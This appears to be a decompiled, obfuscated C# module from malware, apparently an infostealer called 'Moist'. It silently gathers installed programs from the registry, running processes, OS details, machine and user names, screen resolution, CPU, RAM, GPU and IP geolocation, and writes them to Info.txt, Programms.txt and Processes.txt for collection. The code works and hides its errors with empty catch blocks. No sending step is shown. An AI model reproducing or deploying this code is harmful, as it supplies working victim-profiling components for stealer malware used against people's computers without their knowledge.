using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Moist;

// Token: 0x02000053 RID: 83
internal class Class22
{
	// Token: 0x0600022C RID: 556 RVA: 0x0001127C File Offset: 0x0000F47C
	public static void smethod_0(string string_0)
	{
		Class22.smethod_7(string_0);
		using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\Programms.txt", false, Encoding.Default))
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
				string[] subKeyNames = registryKey.GetSubKeyNames();
				for (int i = 0; i < subKeyNames.Length; i++)
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
					string text = registryKey2.GetValue("DisplayName") as string;
					if (text != null)
					{
						streamWriter.WriteLine(text);
					}
				}
			}
			catch
			{
			}
		}
		try
		{
			using (StreamWriter streamWriter2 = new StreamWriter(string_0 + "\\Processes.txt", false, Encoding.Default))
			{
				Process[] processes = Process.GetProcesses();
				for (int j = 0; j < processes.Length; j++)
				{
					streamWriter2.WriteLine(processes[j].ProcessName.ToString());
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600022D RID: 557 RVA: 0x000113A0 File Offset: 0x0000F5A0
	public static string smethod_1()
	{
		string result;
		try
		{
			string text = string.Empty;
			string queryString = "SELECT * FROM Win32_VideoController";
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString))
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = text + managementObject["Description"].ToString() + " ";
				}
			}
			result = ((!string.IsNullOrEmpty(text)) ? text : "N/A");
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x0600022E RID: 558 RVA: 0x00011464 File Offset: 0x0000F664
	public static string smethod_2()
	{
		string result;
		try
		{
			ManagementScope scope = new ManagementScope();
			ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
			ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
			long num = 0L;
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
				num += num2;
			}
			num = num / 1024L / 1024L;
			result = num.ToString();
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x0600022F RID: 559 RVA: 0x0001152C File Offset: 0x0000F72C
	public static string smethod_3()
	{
		string result;
		try
		{
			ManagementObjectCollection instances = new ManagementClass("SELECT * FROM Win32_Processor").GetInstances();
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				text = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
			}
			result = text;
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x06000230 RID: 560 RVA: 0x000115B8 File Offset: 0x0000F7B8
	public static string smethod_4()
	{
		foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
		{
			ManagementObject managementObject = (ManagementObject)managementBaseObject;
			try
			{
				return string.Concat(new string[]
				{
					((string)managementObject["Caption"]).Trim(),
					", ",
					(string)managementObject["Version"],
					", ",
					(string)managementObject["OSArchitecture"]
				});
			}
			catch
			{
			}
		}
		return "BIOS Maker: Unknown";
	}

	// Token: 0x06000231 RID: 561 RVA: 0x00011684 File Offset: 0x0000F884
	public static string smethod_5()
	{
		string result;
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				text = (string)((ManagementObject)managementBaseObject)["Name"];
			}
			result = text;
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x06000232 RID: 562 RVA: 0x00011710 File Offset: 0x0000F910
	public static string smethod_6()
	{
		string result;
		try
		{
			ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
			string text = string.Empty;
			foreach (ManagementBaseObject managementBaseObject in instances)
			{
				text = (string)((ManagementObject)managementBaseObject)["Name"];
			}
			result = text;
		}
		catch
		{
			result = "Unknown";
		}
		return result;
	}

	// Token: 0x06000233 RID: 563 RVA: 0x0001179C File Offset: 0x0000F99C
	public static void smethod_7(string string_0)
	{
		ComputerInfo computerInfo = new ComputerInfo();
		Size size = Screen.PrimaryScreen.Bounds.Size;
		try
		{
			using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\Info.txt", false, Encoding.Default))
			{
				TextWriter textWriter = streamWriter;
				string[] array = new string[24];
				array[0] = "OC verison - ";
				int num = 1;
				OperatingSystem osversion = Environment.OSVersion;
				array[num] = ((osversion != null) ? osversion.ToString() : null);
				array[2] = " | ";
				array[3] = computerInfo.OSFullName;
				array[4] = "\nMachineName - ";
				array[5] = Environment.MachineName;
				array[6] = "/";
				array[7] = Environment.UserName;
				array[8] = "\nResolution - ";
				int num2 = 9;
				Size size2 = size;
				array[num2] = size2.ToString();
				array[10] = "\nCurrent time Utc - ";
				array[11] = DateTime.UtcNow.ToString();
				array[12] = "\nCurrent time - ";
				array[13] = DateTime.Now.ToString();
				array[14] = "\nCPU - ";
				array[15] = Class22.smethod_6();
				array[16] = "\nRAM - ";
				array[17] = Class22.smethod_2();
				array[18] = "\nGPU - ";
				array[19] = Class22.smethod_1();
				array[20] = "\n\n\nIP Geolocation: ";
				array[21] = Moist.Help.IP;
				array[22] = " ";
				array[23] = Moist.Help.Country();
				textWriter.WriteLine(string.Concat(array));
				streamWriter.Close();
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000234 RID: 564 RVA: 0x0000446C File Offset: 0x0000266C
	public Class22()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}
}
